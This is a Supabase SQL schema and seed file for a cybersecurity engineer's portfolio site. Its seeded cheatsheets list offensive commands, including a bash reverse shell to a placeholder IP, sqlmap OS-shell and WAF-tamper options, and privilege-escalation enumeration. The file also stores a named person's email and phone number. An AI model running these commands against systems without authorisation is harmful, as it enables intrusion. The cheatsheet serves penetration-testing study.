-- ============================================================
-- 0xIdiot Portfolio — Supabase Schema
-- Run this entire file in: Supabase > SQL Editor > New Query
-- ============================================================

-- ENABLE UUID extension
create extension if not exists "uuid-ossp";

-- ============================================================
-- TABLES
-- ============================================================

-- Profile / About
create table if not exists profile (
  id uuid primary key default uuid_generate_v4(),
  name text not null default 'Abhishek N',
  alias text not null default '0xIdiot',
  tagline text not null default 'Cybersecurity Engineer & Full-Stack Developer',
  bio text not null default '',
  location text not null default 'Bangalore, Karnataka, IN',
  avatar_url text,
  resume_url text,
  bmc_username text default 'YOUR_BMC_USERNAME',
  updated_at timestamptz default now()
);

-- Stats
create table if not exists stats (
  id uuid primary key default uuid_generate_v4(),
  label text not null,
  value text not null,
  sub text,
  icon text,
  sort_order int default 0
);

-- Projects
create table if not exists projects (
  id uuid primary key default uuid_generate_v4(),
  name text not null,
  description text not null,
  status text not null default 'shipped', -- 'live' | 'shipped' | 'wip' | 'open-source'
  stack text[] default '{}',
  demo_url text,
  github_url text,
  image_url text,
  featured boolean default false,
  sort_order int default 0,
  created_at timestamptz default now()
);

-- Timeline
create table if not exists timeline (
  id uuid primary key default uuid_generate_v4(),
  date_label text not null,
  title text not null,
  body text not null,
  tags text[] default '{}',
  highlight boolean default false,
  sort_order int default 0
);

-- Writeups
create table if not exists writeups (
  id uuid primary key default uuid_generate_v4(),
  title text not null,
  platform text not null, -- 'HTB' | 'THM' | 'picoCTF' | 'PortSwigger' | 'Other'
  difficulty text not null default 'easy', -- 'easy' | 'medium' | 'hard' | 'insane'
  content text, -- markdown
  external_url text,
  machine_os text, -- 'Linux' | 'Windows' | 'Other'
  tags text[] default '{}',
  published boolean default false,
  created_at timestamptz default now()
);

-- Cheatsheets
create table if not exists cheatsheets (
  id uuid primary key default uuid_generate_v4(),
  title text not null,
  category text not null default 'General',
  entries jsonb not null default '[]', -- [{label, cmd}]
  sort_order int default 0
);

-- Badges (hero badges)
create table if not exists badges (
  id uuid primary key default uuid_generate_v4(),
  label text not null,
  hot boolean default false,
  sort_order int default 0
);

-- Contact links
create table if not exists contact_links (
  id uuid primary key default uuid_generate_v4(),
  label text not null,
  value text not null,
  url text not null,
  icon text not null default '@',
  sort_order int default 0
);

-- Contact messages (from visitors)
create table if not exists messages (
  id uuid primary key default uuid_generate_v4(),
  name text not null,
  email text not null,
  subject text,
  message text not null,
  read boolean default false,
  created_at timestamptz default now()
);

-- Viewer count
create table if not exists views (
  id int primary key default 1,
  count bigint default 0
);
insert into views (id, count) values (1, 0) on conflict do nothing;

-- ============================================================
-- ROW LEVEL SECURITY
-- ============================================================

alter table profile enable row level security;
alter table stats enable row level security;
alter table projects enable row level security;
alter table timeline enable row level security;
alter table writeups enable row level security;
alter table cheatsheets enable row level security;
alter table badges enable row level security;
alter table contact_links enable row level security;
alter table messages enable row level security;
alter table views enable row level security;

-- PUBLIC READ (all tables except messages)
create policy "Public read profile" on profile for select using (true);
create policy "Public read stats" on stats for select using (true);
create policy "Public read projects" on projects for select using (true);
create policy "Public read timeline" on timeline for select using (true);
create policy "Public read writeups" on writeups for select using (published = true);
create policy "Public read cheatsheets" on cheatsheets for select using (true);
create policy "Public read badges" on badges for select using (true);
create policy "Public read contact_links" on contact_links for select using (true);
create policy "Public read views" on views for select using (true);

-- ADMIN WRITE (only authenticated user with admin email)
create policy "Admin all profile" on profile for all using (auth.email() = current_setting('app.admin_email', true));
create policy "Admin all stats" on stats for all using (auth.email() = current_setting('app.admin_email', true));
create policy "Admin all projects" on projects for all using (auth.email() = current_setting('app.admin_email', true));
create policy "Admin all timeline" on timeline for all using (auth.email() = current_setting('app.admin_email', true));
create policy "Admin all writeups" on writeups for all using (auth.email() = current_setting('app.admin_email', true));
create policy "Admin all cheatsheets" on cheatsheets for all using (auth.email() = current_setting('app.admin_email', true));
create policy "Admin all badges" on badges for all using (auth.email() = current_setting('app.admin_email', true));
create policy "Admin all contact_links" on contact_links for all using (auth.email() = current_setting('app.admin_email', true));
create policy "Admin read messages" on messages for select using (auth.email() = current_setting('app.admin_email', true));
create policy "Admin update messages" on messages for update using (auth.email() = current_setting('app.admin_email', true));
create policy "Admin delete messages" on messages for delete using (auth.email() = current_setting('app.admin_email', true));

-- PUBLIC INSERT messages
create policy "Public insert messages" on messages for insert with check (true);

-- PUBLIC UPDATE views (increment)
create policy "Public update views" on views for update using (true);

-- ============================================================
-- STORAGE BUCKET (for avatar, project images, resume)
-- ============================================================
insert into storage.buckets (id, name, public) values ('portfolio', 'portfolio', true) on conflict do nothing;
create policy "Public read portfolio storage" on storage.objects for select using (bucket_id = 'portfolio');
create policy "Admin write portfolio storage" on storage.objects for insert with check (bucket_id = 'portfolio' and auth.role() = 'authenticated');
create policy "Admin update portfolio storage" on storage.objects for update using (bucket_id = 'portfolio' and auth.role() = 'authenticated');
create policy "Admin delete portfolio storage" on storage.objects for delete using (bucket_id = 'portfolio' and auth.role() = 'authenticated');

-- ============================================================
-- SEED DATA — your actual info
-- ============================================================

insert into profile (name, alias, tagline, bio, location, bmc_username) values (
  'Abhishek N',
  '0xIdiot',
  'Cybersecurity Engineer & Full-Stack Developer',
  'Security engineer building real-world offensive security tooling. Creator of XCloak — an AI-powered cybersecurity SaaS. Top 1% on TryHackMe globally. PortSwigger Practitioner. Pursuing MCA in Cybersecurity at S-VYASA University, Bangalore.',
  'Bangalore, Karnataka, IN',
  'YOUR_BMC_USERNAME'
);

insert into stats (label, value, sub, sort_order) values
  ('TryHackMe Global Rank', '#3515', 'Top 1% worldwide', 1),
  ('Rooms Completed', '413', 'TryHackMe', 2),
  ('picoCTF Challenges', '95', 'Easy tier cleared', 3),
  ('PortSwigger Labs', '46+', 'Practitioner level', 4),
  ('Academic CGPA', '9.8', 'Sem 2 — MCA Cybersecurity', 5),
  ('Docker Tools Orchestrated', '7', 'ESO pentest pipeline', 6);

insert into badges (label, hot, sort_order) values
  ('THM Top 1%', true, 1),
  ('PortSwigger Practitioner', true, 2),
  ('picoCTF Solver', false, 3),
  ('VAPT', false, 4),
  ('Web App Security', false, 5),
  ('Digital Forensics', false, 6),
  ('CTF Player', false, 7),
  ('SaaS Builder', false, 8);

insert into projects (name, description, status, stack, demo_url, github_url, featured, sort_order) values
  ('XCloak / ESO', 'AI-powered cybersecurity SaaS. Users describe a scan goal in plain English, AI plans and executes end-to-end. 7 Docker-isolated tools, real-time WebSocket streaming, PDF pentest report export. Paid at ₹999/month.', 'live', ARRAY['Next.js 15','FastAPI','Supabase','Docker','Redis','RabbitMQ','PostgreSQL','Nmap','Nuclei'], 'https://xcloak.tech', 'https://github.com/The-Abhishek1/Xcl0ak-New', true, 1),
  ('ForenX', 'Linux digital forensics CLI toolkit for incident response. Analyzes auth.log, memory dumps, PCAP captures, and file artifacts. Modular design with per-action flags.', 'open-source', ARRAY['Python 3','Scapy','Volatility','ExifTool'], null, 'https://github.com/The-Abhishek1/ForenX', false, 2),
  ('AI Student Placement System', 'AI-driven student-company matching platform using Google Gemini and OpenAI. Real-time notifications via Socket.io. Secure auth with bcrypt + JWT + TOTP 2FA.', 'shipped', ARRAY['Next.js 14','MongoDB','Socket.io','Gemini API','OpenAI','2FA/TOTP'], null, 'https://github.com/The-Abhishek1/AI-Student-Placement-System', false, 3),
  ('CRMSX', 'Real-time CRM and management system with live data updates, user management, and status tracking. Decoupled React frontend and Node/Express backend.', 'shipped', ARRAY['React.js','Node.js','Express.js','MySQL'], null, 'https://github.com/The-Abhishek1/CRMSX', false, 4),
  ('PropertyNexus', 'Full CRUD property listing platform with status workflow, price-change history, buyer tracking, analytics dashboard, and document attachments.', 'shipped', ARRAY['Next.js 14','Firebase','Tailwind CSS','Recharts'], null, 'https://github.com/The-Abhishek1/Property-Manager', false, 5),
  ('Aethr', 'Next.js/TypeScript social platform with Discord-inspired layout, Supabase backend, reputation economy, and community/channel system.', 'wip', ARRAY['Next.js','TypeScript','Supabase'], null, 'https://github.com/The-Abhishek1', false, 6);

insert into timeline (date_label, title, body, tags, highlight, sort_order) values
  ('2025 — Present', 'XCloak goes live as paid SaaS', 'Launched XCloak at xcloak.tech with Razorpay billing. ESO backend orchestrates 7 Docker tools with AI planning, real-time WebSocket streaming, and PDF pentest report generation.', ARRAY['Milestone','FastAPI','Next.js 15'], true, 1),
  ('Apr 2025', 'Jr. Penetration Tester Path — TryHackMe', 'Completed the full Jr. Penetration Tester learning path. Reached global rank #3515, top 1% worldwide with 413 rooms completed.', ARRAY['Certification','TryHackMe'], true, 2),
  ('2024 — 2025', 'MCA in Cybersecurity @ S-VYASA University', 'Pursuing MCA specializing in Cybersecurity, Ethical Hacking & Cyber Forensics. CGPA: 9.0 (Sem 1), 9.8 (Sem 2), 9.4 (Sem 3).', ARRAY['Education','CGPA 9.8'], false, 3),
  ('2024', 'ForenX — Open Source Forensics Toolkit', 'Built and open-sourced ForenX, a modular Linux digital forensics CLI for incident response.', ARRAY['Open Source','Python','Forensics'], false, 4),
  ('2023 — 2024', 'EC-Council & Cisco Certifications', 'Completed Android Bug Bounty, SQL Injection Attacks, Dark Web & Cryptocurrency (EC-Council). Cisco: Endpoint Security, Intro to Cybersecurity, Networking Basics.', ARRAY['Certifications','EC-Council','Cisco'], false, 5),
  ('2021 — 2024', 'BCA @ Surana College — CGPA 8.64', 'Bachelor of Computer Applications. Started journey into ethical hacking and CTFs.', ARRAY['Education','BCA'], false, 6),
  ('Target', 'CEH → OSCP', 'CEH for corporate HR recognition. OSCP (OffSec) for elite offensive security certification. Goal: international cybersecurity role.', ARRAY['Next','OSCP','CEH'], true, 7);

insert into cheatsheets (title, category, entries, sort_order) values
  ('Nmap Quick Ref', 'Recon', '[{"label":"Full port scan","cmd":"nmap -p- -T4 <ip>"},{"label":"Service + version","cmd":"-sV -sC"},{"label":"UDP scan","cmd":"-sU --top-ports 100"},{"label":"OS detection","cmd":"-O --osscan-guess"},{"label":"Output all formats","cmd":"-oA scan"},{"label":"Vuln scripts","cmd":"--script vuln"}]', 1),
  ('Gobuster / FFuF', 'Enumeration', '[{"label":"Dir brute","cmd":"gobuster dir -u URL -w wl"},{"label":"DNS brute","cmd":"gobuster dns -d domain"},{"label":"Vhost fuzz","cmd":"ffuf -H Host: FUZZ"},{"label":"Filter by size","cmd":"ffuf -fs <size>"},{"label":"POST body fuzz","cmd":"ffuf -d user=FUZZ"}]', 2),
  ('SQLMap', 'Exploitation', '[{"label":"Basic scan","cmd":"sqlmap -u URL?id=1"},{"label":"With cookie","cmd":"--cookie=sess=abc"},{"label":"Dump DB","cmd":"--dump -D dbname"},{"label":"OS shell","cmd":"--os-shell"},{"label":"Tamper WAF","cmd":"--tamper=space2comment"}]', 3),
  ('Linux PrivEsc', 'Post-Exploitation', '[{"label":"SUID bins","cmd":"find / -perm -4000"},{"label":"Sudo list","cmd":"sudo -l"},{"label":"Cron jobs","cmd":"cat /etc/crontab"},{"label":"Writable paths","cmd":"find / -writable 2>/dev/null"},{"label":"GTFOBins","cmd":"gtfobins.github.io"}]', 4),
  ('Reverse Shells', 'Exploitation', '[{"label":"Bash","cmd":"bash -i >& /dev/tcp/IP/PORT 0>&1"},{"label":"nc listener","cmd":"nc -lvnp 4444"},{"label":"Upgrade TTY","cmd":"python3 -c import pty;pty.spawn(/bin/bash)"},{"label":"RevShells","cmd":"revshells.com"}]', 5),
  ('Burp Suite', 'Web App', '[{"label":"Intercept toggle","cmd":"Ctrl+T"},{"label":"Send to Repeater","cmd":"Ctrl+R"},{"label":"Send to Intruder","cmd":"Ctrl+I"},{"label":"Active scan","cmd":"Right-click → Scan"},{"label":"Match & Replace","cmd":"Proxy → Options"}]', 6);

insert into contact_links (label, value, url, icon, sort_order) values
  ('Email', 'abhishekn1003@gmail.com', 'mailto:abhishekn1003@gmail.com', '@', 1),
  ('GitHub', 'github.com/The-Abhishek1', 'https://github.com/The-Abhishek1', 'GH', 2),
  ('LinkedIn', 'linkedin.com/in/abhishek-gowda17', 'https://linkedin.com/in/abhishek-gowda17', 'in', 3),
  ('TryHackMe', 'tryhackme.com/p/0xIdiot', 'https://tryhackme.com/p/0xIdiot', 'THM', 4),
  ('XCloak SaaS', 'xcloak.tech', 'https://xcloak.tech', '⬡', 5),
  ('Phone', '+91 6366652685', 'tel:+916366652685', '#', 6);

-- ============================================================
-- RPC: increment_views (call from client safely)
-- ============================================================
create or replace function increment_views()
returns void
language sql
security definer
as $$
  update views set count = count + 1 where id = 1;
$$;
